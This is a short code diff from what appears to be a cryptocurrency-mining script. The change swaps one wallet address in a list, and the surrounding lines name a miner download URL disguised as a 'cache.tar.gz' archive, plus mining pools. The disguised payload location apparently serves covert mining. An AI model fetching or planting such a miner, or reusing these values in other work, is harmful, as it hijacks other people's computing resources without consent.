@@ -12,7 +12,7 @@ miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"
 
 wallets = [
     "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y",
-    "RVJu5D6fPxU9xYgYmLQHLUq1zWe9vALeMm"
+    "RQ1Va1Ytw88UfBsWP59C89aDtJWnUdmYDH"
 ]
 
 pools = [
